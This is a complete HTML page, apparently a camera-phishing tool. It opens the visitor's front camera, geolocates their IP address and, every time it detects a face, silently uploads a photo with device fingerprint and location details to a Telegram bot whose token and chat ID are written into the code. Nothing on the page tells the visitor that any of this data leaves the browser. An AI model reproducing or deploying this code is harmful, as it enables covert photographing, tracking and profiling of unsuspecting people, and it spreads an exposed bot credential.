<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Face Detect Auto Telegram</title>

<style>
body {
    margin: 0;
    background: black;
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    font-family: sans-serif;
}
video {
    width: 100%;
    max-width: 360px;
    transform: scaleX(-1);
    border: 2px solid #0f0;
}
button {
    margin-top: 12px;
    padding: 10px 20px;
    font-size: 16px;
}
</style>
</head>

<body>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>
<button onclick="start()">â–¶ START</button>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

/* Telegram bot token */
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";

/* Telegram receiver chat id (your ID / group ID) */
const CHAT_ID = "8319568593";

let intervalId = null;
let locationData = "Location not available";
let mapLink = "N/A";

/* ðŸ”¹ Get IP + location */
fetch("https://ipapi.co/json/")
.then(res => res.json())
.then(data => {
    if (data.latitude && data.longitude) {
        mapLink = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
        locationData = `
ðŸŒ Location
â€¢ City: ${data.city}
â€¢ Region: ${data.region}
â€¢ Country: ${data.country_name}
â€¢ IP: ${data.ip}
â€¢ Map: ${mapLink}
        `;
    }
});

/* ðŸ”¹ Front camera */
navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
}).then(stream => {
    video.srcObject = stream;
});

/* ðŸ”¹ Face detector */
const faceDetector = ("FaceDetector" in window)
    ? new FaceDetector({ fastMode: true })
    : null;

function start() {
    if (!faceDetector) {
        console.error("FaceDetector not supported");
        return;
    }
    if (intervalId) return;
    intervalId = setInterval(detectFaceAndSend, 2000);
}

async function detectFaceAndSend() {
    try {
        const faces = await faceDetector.detect(video);
        if (faces.length > 0) {
            captureAndSend();
        }
    } catch (e) {
        console.error(e);
    }
}

function captureAndSend() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {

        const caption = `
ðŸ“¸ Face Detected

ðŸ“± Device
â€¢ UA: ${navigator.userAgent}
â€¢ Platform: ${navigator.platform}
â€¢ Screen: ${screen.width}x${screen.height}
â€¢ Language: ${navigator.language}
â€¢ Time: ${new Date().toLocaleString()}

${locationData}
        `;

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob);
        formData.append("caption", caption);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });

    }, "image/jpeg", 0.7);
}
</script>

</body>
</html>
